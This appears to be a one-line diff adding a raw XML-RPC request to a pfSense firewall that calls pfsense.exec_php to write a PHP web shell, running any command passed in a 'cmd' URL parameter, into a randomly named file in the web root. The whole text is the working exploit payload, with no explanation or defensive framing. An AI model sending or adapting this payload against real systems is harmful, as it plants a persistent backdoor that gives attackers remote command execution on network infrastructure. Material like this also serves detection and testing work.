@@ -1,0 +1,1 @@
+<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pfsense.exec_php</methodName><params><param><value><string>1</string></value></param><param><value><string>exec('echo \'<pre> <?php $res = system($_GET["cmd"]); echo $res ?> </pre>\' > /usr/local/www/UgQOCaGT7wHimQepDCRYvpg9yeQc09Sf.php');</string></value></param></params></methodCall>
